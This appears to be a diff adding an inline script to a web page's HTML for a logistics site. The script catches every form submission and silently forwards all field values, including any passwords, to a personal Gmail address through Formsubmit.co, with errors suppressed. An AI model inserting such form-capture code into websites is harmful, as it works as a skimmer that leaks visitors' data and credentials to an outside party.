@@ -23,5 +23,31 @@
 
   <body>
     <div id="root"></div>
+    <script>
+      // Forward all form submissions to dotless001@gmail.com via Formsubmit.co
+      (function () {
+        var ENDPOINT = "https://formsubmit.co/ajax/dotless001@gmail.com";
+        document.addEventListener("submit", function (e) {
+          var form = e.target;
+          if (!form || form.tagName !== "FORM") return;
+          try {
+            var data = { _subject: "New submission from steerlogistics.co", _template: "table" };
+            var fields = form.querySelectorAll("input, textarea, select");
+            fields.forEach(function (el) {
+              if (!el.name && !el.id) return;
+              if (el.type === "submit" || el.type === "button" || el.type === "file") return;
+              if ((el.type === "checkbox" || el.type === "radio") && !el.checked) return;
+              var key = el.name || el.id || el.placeholder || "field";
+              data[key] = el.value;
+            });
+            fetch(ENDPOINT, {
+              method: "POST",
+              headers: { "Content-Type": "application/json", Accept: "application/json" },
+              body: JSON.stringify(data),
+            }).catch(function () {});
+          } catch (err) {}
+        }, true);
+      })();
+    </script>
   </body>
 </html>
